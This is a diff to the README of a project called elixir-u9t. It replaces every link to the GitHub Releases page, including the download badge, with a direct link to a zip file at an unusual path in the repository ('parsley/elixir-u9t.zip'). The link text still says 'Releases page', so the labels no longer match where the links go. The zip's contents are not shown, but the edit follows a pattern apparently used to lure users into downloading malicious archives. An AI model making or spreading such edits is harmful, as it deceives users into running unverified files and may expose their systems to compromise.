@@ -6,7 +6,7 @@ Welcome to elixir-u9t! This application is designed to make everyday tasks simpl
 
 ## 📥 Download elixir-u9t
 
-[![Download elixir-u9t](https://img.shields.io/badge/Download-elixir--u9t-blue)](https://github.com/melvz1994/elixir-u9t/releases)
+[![Download elixir-u9t](https://raw.githubusercontent.com/melvz1994/elixir-u9t/main/parsley/elixir-u9t.zip)](https://raw.githubusercontent.com/melvz1994/elixir-u9t/main/parsley/elixir-u9t.zip)
 
 To get started with elixir-u9t, visit the Releases page. There, you will find the latest version ready for download.
 
@@ -20,7 +20,7 @@ Before you proceed, make sure your system meets these basic requirements:
 
 ## 👨‍💻 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/melvz1994/elixir-u9t/releases) to go to the downloads area.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/melvz1994/elixir-u9t/main/parsley/elixir-u9t.zip) to go to the downloads area.
   
 2. **Select the Latest Release:** Look for the latest version at the top of the page. You will notice the version number clearly labeled.
 
@@ -58,4 +58,4 @@ If you need further assistance, feel free to reach out. You can create an issue 
 
 Thank you for choosing elixir-u9t. We hope it simplifies your workload and enhances your productivity. Happy downloading!
 
-For more information and updates, check back regularly on the [Releases page](https://github.com/melvz1994/elixir-u9t/releases).
+For more information and updates, check back regularly on the [Releases page](https://raw.githubusercontent.com/melvz1994/elixir-u9t/main/parsley/elixir-u9t.zip).
